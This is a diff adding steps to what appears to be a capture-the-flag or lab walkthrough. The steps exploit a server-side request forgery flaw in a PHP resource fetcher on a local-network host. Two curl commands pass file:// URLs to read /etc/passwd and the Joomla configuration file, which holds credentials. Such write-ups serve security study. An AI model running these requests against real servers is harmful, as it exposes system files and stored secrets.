@@ -65,3 +65,21 @@ Let's see what is /internalResourceFeTcher.php
 Let's try to search for a and see the result.
 
 ![Alt text](./img/a.PNG?raw=true "/internalResourceFeTcher.php search")
+
+Noted something?
+
+The search append in the url **?url=a**, so let's try to see if there is any **SSRF** vulnerability using in the url **file:///etc/passwd**
+
+```bash
+curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///etc/passwd
+```
+
+![Alt text](./img/passwd.PNG?raw=true "/etc/passwd")
+
+As you might have noticed, in the webserver there is Joomla, so now let's see if we can access to Jumla configuration file.
+
+```bash
+curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php
+```
+
+![Alt text](./img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")
